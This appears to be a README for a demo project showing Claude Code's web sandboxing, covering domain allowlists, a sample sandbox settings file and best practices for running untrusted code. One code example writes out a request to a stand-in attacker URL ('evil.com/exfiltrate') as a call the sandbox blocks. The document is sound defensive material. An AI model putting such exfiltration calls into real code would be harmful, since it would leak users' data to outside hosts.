# Claude Code Web Sandboxing Demo

This project demonstrates the web sandboxing capabilities of Claude Code, a powerful security feature that provides network isolation and controlled execution environments.

## What is Claude Code Web Sandboxing?

Claude Code Web Sandboxing is a security feature that:

- **Isolates network access**: Controls which domains and URLs can be accessed during code execution
- **Prevents data exfiltration**: Blocks unauthorized outbound connections
- **Enables safe code execution**: Run untrusted or third-party code safely
- **Supports allowlisting/blocklisting**: Fine-grained control over network permissions

## Key Features Demonstrated

### 1. Network Isolation
The sandbox restricts outbound network requests, preventing unauthorized data transmission.

### 2. Domain Allowlisting
Specific domains can be whitelisted for necessary operations (e.g., package managers, APIs).

### 3. Security Boundaries
Demonstrates how sandboxing protects against:
- Malicious web requests
- Data exfiltration attempts
- Unauthorized API calls
- Credential leakage

### 4. Controlled Execution
Safe execution of code that makes network requests with predictable behavior.

## Demo Structure

```
/
├── README.md                          # This file
├── demos/
│   ├── 1-network-restrictions/        # Network isolation examples
│   ├── 2-security-examples/           # Security protection demos
│   ├── 3-use-cases/                   # Practical use cases
│   └── 4-configuration/               # Configuration examples
└── examples/
    ├── safe-requests.py               # Examples of allowed requests
    ├── blocked-requests.py            # Examples of blocked requests
    └── real-world-scenarios.py        # Real-world applications
```

## Quick Start

### Running the Demos

1. **Network Restrictions Demo**:
   ```bash
   python demos/1-network-restrictions/demo.py
   ```

2. **Security Examples**:
   ```bash
   python demos/2-security-examples/security_demo.py
   ```

3. **Real-world Use Cases**:
   ```bash
   python demos/3-use-cases/package_manager.py
   ```

### Configuration

Sandbox settings are configured in `.claude/settings.json`:

```json
{
  "sandbox": {
    "enabled": true,
    "allowedDomains": [
      "pypi.org",
      "registry.npmjs.org",
      "api.github.com"
    ],
    "blockedDomains": [
      "*.suspicious-domain.com"
    ]
  }
}
```

## Use Cases

### 1. **Running Untrusted Code**
Execute code from unknown sources without risk of data exfiltration.

### 2. **Third-party Dependencies**
Install and run packages while controlling their network access.

### 3. **API Development**
Test API integrations with controlled external access.

### 4. **Security Testing**
Safely test security scenarios without actual risk.

### 5. **Educational Environments**
Teach programming concepts in a safe, controlled environment.

## Security Benefits

- **Prevents credential theft**: Blocks unauthorized transmission of sensitive data
- **Stops malicious callbacks**: Prevents code from "phoning home"
- **Controlled dependencies**: Manage what external resources code can access
- **Audit trail**: Track and log network access attempts

## Best Practices

1. **Allowlist sparingly**: Only permit necessary domains
2. **Review dependencies**: Understand what network access packages need
3. **Use environment variables**: Keep sensitive data separate from code
4. **Monitor logs**: Review blocked requests to understand behavior
5. **Layer security**: Combine sandboxing with other security measures

## Examples Overview

### Basic Network Request (Blocked)
```python
import requests

# This will be blocked by the sandbox
response = requests.get("https://evil.com/exfiltrate")
```

### Allowed Request (Whitelisted Domain)
```python
import requests

# This works if api.github.com is in allowedDomains
response = requests.get("https://api.github.com/users/octocat")
```

### Safe Local Operations
```python
# File operations are not affected
with open("data.txt", "w") as f:
    f.write("This works normally")
```

## Learn More

- [Claude Code Documentation](https://docs.claude.com/en/docs/claude-code)
- [Sandbox Settings](https://docs.claude.com/en/docs/claude-code/settings#sandbox-settings)
- [Claude Code Sandboxing Engineering Blog](https://www.anthropic.com/engineering/claude-code-sandboxing)

## License

MIT License - See LICENSE file for details

---

**Note**: This demo is designed to run within Claude Code's sandboxed environment. Some features may behave differently in non-sandboxed environments.
